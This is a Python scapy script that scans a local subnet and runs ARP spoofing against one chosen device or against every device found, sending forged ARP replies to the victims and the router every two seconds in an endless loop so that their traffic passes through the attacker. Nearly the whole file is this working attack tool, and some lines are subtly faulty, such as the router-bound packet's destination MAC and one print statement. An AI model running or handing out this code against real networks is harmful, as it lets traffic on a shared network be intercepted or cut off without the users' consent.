#! /usr/bin/env python

import scapy.all as scapy
import argparse
import subprocess
import time
import sys

def get_args():
    parser = argparse.ArgumentParser()
    parser.add_argument('-t','--target',dest='target',help='Specify target ip address')
    parser.add_argument('-m','--mac',dest='target_mac',help='Specify target mac_address')
    parser.add_argument('-r','--host', dest='host',help='Specify host ip address')
    parser.add_argument('-a','--all',dest='all_net',help='Spoof all devices connected to new work[specify router ip]')
    parser.add_argument('-s','--scan',dest='scan',help='Scans for connected devices[specify router ip]')

    options = parser.parse_args()
    return options

def scan(ip):
    ip = ip + '/24'
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst='ff:ff:ff:ff:ff:ff')
    arp_request_broadcast = broadcast/arp_request
    answerlist = scapy.srp(arp_request_broadcast,timeout=1,verbose=False)[0]

    return answerlist

def print_results(answerlist):
    print('[+] ..............Scanning.............. [+] \n')
    print('IP\t\t\t\tMac')
    print('-----------------------------------------')

    connected_list = []
    ip_list = []
    mac_list = []

    for element in answerlist:
        connected_dist = {'ip':element[1].psrc, 'mac':element[1].hwsrc}
        connected_list.append(connected_dist)
        
    for clients in connected_list:
        print(clients['ip'] + '\t\t' + clients['mac'])
        ip_list.append(clients['ip'])
        mac_list.append(clients['mac'])
        
    # removing router ip and mac from list
    router_ip = ip_list.pop(0)
    router_mac = mac_list.pop(0)
    target_num = len(ip_list)

    return ip_list , mac_list , router_ip , target_num

def arpspoof_target(t_ip,t_mac,router_ip):
    # Sending to target
    packet = scapy.ARP(op=2,pdst=t_ip,hwdst=t_mac,psrc=router_ip)
    scapy.send(packet,verbose=False)
     
    # Sending to router 
    packet = scapy.ARP(op=2,pdst=router_ip,hwdst=t_mac,psrc=t_ip)
    scapy.send(packet,verbose=False)

def arpspoof_all(ip_list,mac_list,router_ip,target_num):
    
    for i in range(len(ip_list)):
        # Sending to target
        packet = scapy.ARP(op=2,pdst=ip_list[i],hwdst=mac_list[i],psrc=router_ip)
        scapy.send(packet,verbose=False)
        

        # Sending to router 
        packet = scapy.ARP(op=2,pdst=router_ip,hwdst=mac_list[i],psrc=ip_list[i])
        scapy.send(packet,verbose=False)

        print('')
        print('\r [+] Sent Packet to : '+ ip_list[i]) + ' \t [+] Targets : ' + str(target_num),
        sys.stdout.flush()

#Initializing functions
options = get_args()

# checks
if options.scan:
    answered_list = scan(options.scan)
    print_results(answered_list)

elif options.all_net:
    answered_list = scan(options.all_net)
    ip_list,mac_list,router_ip,target_num = print_results(answered_list)
    num  = 0
    while True:
        arpspoof_all(ip_list,mac_list,router_ip,target_num)
        #print('[+] Sent {} packet'.format(num))
        #sys.stdout.flush()
        num = num + 1
        time.sleep(2)

else:
    num = 0
    while True:
        arpspoof_target(options.target,options.target_mac,options.host)
        print('\r [+] Sent {} packet'.format(num)),
        sys.stdout.flush()
        num = num + 1
        time.sleep(2)
